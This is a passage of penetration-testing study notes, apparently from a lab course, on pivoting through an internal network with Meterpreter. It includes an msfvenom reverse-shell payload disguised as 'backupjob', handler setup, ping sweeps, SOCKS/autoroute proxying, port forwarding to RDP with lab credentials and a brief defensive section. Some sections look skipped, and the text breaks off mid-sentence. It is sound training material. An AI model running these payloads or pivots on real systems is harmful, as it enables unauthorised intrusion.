# 🕳️ 1. Meterpreter Tunneling & Port Forwarding

> [!info]  
> **Objective:** Use a Meterpreter session on a pivot host to reach and enumerate systems on an internal network, without relying on SSH port forwarding.
> 
> The key idea is that **Meterpreter itself can become the transport/pivot mechanism**.
> 
> Instead of:
> 
> ```text
> Attack Host → SSH → Pivot → Internal Network
> ```
> 
> we can use:
> 
> ```text
> Attack Host → Meterpreter → Pivot → Internal Network
> ```

---

# 🧠 2. The Network Problem

Assume we have:

```text
Attack Host
10.10.14.18
      |
      | Meterpreter session
      ↓
Ubuntu Pivot
10.129.202.64
172.16.5.129
      |
      | Internal network
      ↓
172.16.5.0/23
      |
      └── Windows Target
          172.16.5.19
```

The attack host cannot directly access:

```text
172.16.5.0/23
```

but the Ubuntu pivot can.

Therefore, the goal is to make the Meterpreter session act as a **bridge** between:

```text
Attack Host
     ↓
Meterpreter
     ↓
Ubuntu
     ↓
172.16.5.0/23
```

> [!important]  
> Once we have a Meterpreter session on a host with access to an internal network, Meterpreter can be used for:
> 
> - Internal network discovery
>     
> - Routing
>     
> - SOCKS proxying
>     
> - Port forwarding
>     
> - Reverse port forwarding
>     
> - Accessing services that the attack host cannot directly reach
>

# 🐧 3. Obtaining a Meterpreter Session on the Ubuntu Pivot

First, create a Linux x64 Meterpreter reverse TCP payload.

## 💻 3.1 Create the Payload

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

Output:

```text
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

### 🔎 Important options

|Option|Meaning|
|---|---|
|`-p linux/x64/meterpreter/reverse_tcp`|Linux x64 Meterpreter reverse TCP payload|
|`LHOST=10.10.14.18`|Attack host receiving the connection|
|`LPORT=8080`|Port on which Metasploit listens|
|`-f elf`|Generate a Linux ELF executable|
|`-o backupjob`|Save the payload as `backupjob`|

The resulting communication is:

```text
Ubuntu Pivot
     │
     │ reverse TCP
     ▼
10.10.14.18:8080
Attack Host
```

# 🎧 4. Configure the Metasploit Handler

Before executing the payload, start a handler:

```text
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080
```

### 🧠 Why `multi/handler`?

`multi/handler` is a generic Metasploit listener capable of handling connections from payloads generated by tools such as `msfvenom`.

The payload and handler must agree on the important parameters:

```text
Payload:
    linux/x64/meterpreter/reverse_tcp
    LHOST = 10.10.14.18
    LPORT = 8080

Handler:
    linux/x64/meterpreter/reverse_tcp
    LHOST = 0.0.0.0
    LPORT = 8080
```

# 🧭 7. Why Meterpreter Is Useful as a Pivot

Now that Meterpreter is running **on the Ubuntu pivot**, commands executed through Meterpreter can cause traffic to originate from Ubuntu.

That matters because Ubuntu has access to:

```text
172.16.5.0/23
```

while the attack host does not.

The mental model is:

```text
                 Attack Host
                10.10.14.18
                     │
                     │ Meterpreter
                     ↓
               Ubuntu Pivot
              10.129.202.64
              172.16.5.129
                     │
                     │ Internal routing
                     ↓
               172.16.5.0/23
                     │
                     ├── Windows A
                     ├── Other Hosts
                     └── Internal Services
```

# 🔎 8. Discovering Hosts with a Ping Sweep

We know the Windows target is on:

```text
172.16.5.0/23
```

If ICMP is allowed, we can discover live systems using a ping sweep.

Meterpreter provides:

```text
post/multi/gather/ping_sweep
```

Run:

```text
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Output:

```text
[*] Performing ping sweep for IP range 172.16.5.0/23
```

### 🧠 Important concept

The important point is **where the traffic originates**.

```text
Attack Host
    │
    │ Meterpreter
    ↓
Ubuntu
    │
    │ ICMP
    ↓
172.16.5.0/23
```

The attack host itself does not need direct connectivity to the internal network.

---

# 🐧 9. Linux Ping Sweep One-Liner

Instead of using the Meterpreter module, we can execute a Linux loop on the pivot:

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

### 🧠 What it does

For each host:

```text
172.16.5.1
172.16.5.2
172.16.5.3
...
172.16.5.254
```

it sends one ICMP request.

The output is filtered for:

```text
bytes from
```

which normally indicates a successful reply.

> [!warning]  
> This particular loop covers `.1` through `.254`, while the stated network is `/23`. A `/23` contains **512 addresses**, spanning two `/24` ranges. Therefore, this exact one-liner does **not** enumerate the entire `172.16.5.0/23` network.

---

# 🪟 10. Windows CMD Ping Sweep

On a Windows pivot:

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### 🔎 Important options

```text
/L %i in (1 1 254)
```

increments `%i` from:

```text
1 → 254
```

`-n 1`:

```text
Send one ping.
```

`-w 100`:

```text
Wait up to 100 ms.
```

`find "Reply"`:

```text
Only display replies.
```

Again, this scans only the `172.16.5.0/24` portion represented by `.1` through `.254`, not the entire `/23`.

# ⚡ 11. PowerShell Ping Sweep

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

This produces a result for each IP indicating whether the host responded.

Conceptually:

```text
172.16.5.1  → True/False
172.16.5.2  → True/False
172.16.5.3  → True/False
...
```

# ⚠️ 12. Why a Ping Sweep May Miss Hosts

A ping sweep does **not necessarily give reliable results on the first attempt**.

One reason mentioned in the scenario is the time required for a host to build its ARP cache.

The first attempt may therefore produce incomplete results.

> [!tip]  
> If the network topology allows it, run the sweep **at least twice**.
> 
> ```text
> First sweep
>     ↓
> ARP information gets populated
>     ↓
> Second sweep
>     ↓
> More reliable discovery
> ```

Another major problem is firewalls.

If:

```text
Host Firewall
     │
     └── blocks ICMP
```

then:

```text
Ping → No response
```

does **not necessarily mean**:

```text
Host → Offline
```

It may simply mean:

```text
ICMP → Blocked
```

---

# 🔎 13. When Ping Fails: Use TCP Scanning

If ICMP is blocked, use a TCP-based scan instead.

For example, we may want to determine whether RDP is available:

```text
172.16.5.19:3389
```

The challenge is that the attack host cannot directly reach:

```text
172.16.5.19
```

So we need another pivoting mechanism.

This is where:

```text
Meterpreter
      +
SOCKS Proxy
      +
AutoRoute
      +
ProxyChains
```

becomes useful.

# 🧦 14. Meterpreter + SOCKS Proxy

Metasploit provides:

```text
auxiliary/server/socks_proxy
```

This creates a SOCKS proxy on the attack host.

Traffic sent to that SOCKS listener can then be routed through the Meterpreter session toward the internal network.

The architecture becomes:

```text
Nmap
  │
  │ ProxyChains
  ↓
127.0.0.1:9050
  │
  │ SOCKS
  ↓
Metasploit
  │
  │ Meterpreter Session
  ↓
Ubuntu Pivot
  │
  ↓
172.16.5.0/23
```

---

```text
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
```

### 🧠 Important

The proxy listens on:

```text
0.0.0.0:9050
```

and uses:

```text

```

in this example.

# ⚙️ 17. Configure ProxyChains

Edit:

```text
/etc/proxychains.conf
```

and add:

```text
socks4  127.0.0.1 9050
```

The traffic flow becomes:

```text
Tool
  ↓
ProxyChains
  ↓
127.0.0.1:9050
  ↓
Metasploit SOCKS
  ↓
Meterpreter
  ↓
Ubuntu
  ↓
Internal Network
```

> [!warning]  
> Depending on the SOCKS server configuration/version, `socks4` may need to be changed to `socks5`.
> 
> The proxy protocol configured in `proxychains.conf` must match what the SOCKS server expects.

# 🛣️ 18. Why SOCKS Alone Is Not Enough

This is a critical concept.

Creating:

```text
127.0.0.1:9050
```

does **not automatically tell Metasploit which internal networks should be reached through Meterpreter**.

We also need to establish routing.

That is the purpose of:

```text
post/multi/manage/autoroute
```

Think:

```text
SOCKS Proxy
    +
Route to Internal Network
    =
Usable Pivot
```

# ⚠️ 25. Why `-sT` Is Important with ProxyChains

The scan uses:

```text
-sT
```

which performs a TCP connect scan.

This is important because many proxying mechanisms cannot transparently handle Nmap's raw packet techniques such as SYN scanning.

The connection is instead established through the normal TCP socket mechanism.

> [!important]  
> When using ProxyChains with Nmap, **TCP connect scanning (`-sT`)** is commonly used because the connection needs to pass through the proxy.

The command also uses:

```text
-Pn
```

which disables host discovery.

This makes sense because ICMP/host discovery may not work properly through the proxy.

# 🔀 26. Two Different Meterpreter Pivoting Techniques

At this point there are two major approaches:

```text
                    Meterpreter Pivot
                          │
             ┌────────────┴────────────┐
             ↓                         ↓
        SOCKS Proxy                Port Forward
             │                         │
       ProxyChains                  portfwd
             │                         │
       Many destinations          Specific service
```

### SOCKS approach

Useful when you want to access **many hosts/ports dynamically**.

```text
Nmap
RDP client
SMB tools
Web tools
Other TCP applications
        ↓
ProxyChains
        ↓
SOCKS
        ↓
Meterpreter
        ↓
Internal network
```

### Port forwarding

Useful when you want to expose **one specific internal service** locally.

```text
localhost:3300
      ↓
Meterpreter
      ↓
172.16.5.19:3389
```

```text
portfwd
```

# 🔌 28. Creating a Local TCP Relay

Use:

```text
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

### 🧠 Understand the parameters

```text
-l 3300
```

Local listening port:

```text
Attack Host:3300
```

```text
-p 3389
```

Remote destination port:

```text
3389
```

```text
-r 172.16.5.19
```

Remote destination:

```text
172.16.5.19
```

Therefore:

```text
Attack Host
localhost:3300
      │
      │ Meterpreter port forward
      ↓
Ubuntu Pivot
      │
      ↓
172.16.5.19:3389
      │
      ↓
Windows RDP
```

# 🖥️ 29. Connect to RDP Through the Forward

Now the attack host can connect to:

```text
localhost:3300
```

using `xfreerdp`:

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

The RDP client thinks it is connecting to:

```text
localhost:3300
```

but Meterpreter transparently forwards the traffic to:

```text
172.16.5.19:3389
```

> [!important]  
> This is a major pivoting concept:
> 
> **The application does not need to understand the internal network.**
> 
> It simply connects to:
> 
> ```text
> localhost:3300
> ```
> 
> while Meterpreter handles the forwarding.

# 🛡️ 31. Defensive Value of `netstat`

The same concept is useful defensively.

If a host is suspected of compromise, inspecting network connections can reveal:

- Unexpected listeners
    
- Unexpected outbound connections
    
- Established sessions
    
- Suspicious processes associated with connections
    

For example:

```text
netstat -antp
```

can associate network connections with process IDs/programs on Linux.

> [!info]  
> From a defender's perspective, network connections can provide clues that a host is being used as a pivot or has established unauthorized sessions.

# 🔄 32. Meterpreter Reverse Port Forwarding

Meterpreter also supports **reverse port forwarding**.

This reverses the direction of the forwarding logic.

Suppose:

```text
Windows
   ↓
Ubuntu Pivot
   ↓
Attack Host
```

and we want Windows to connect to a port
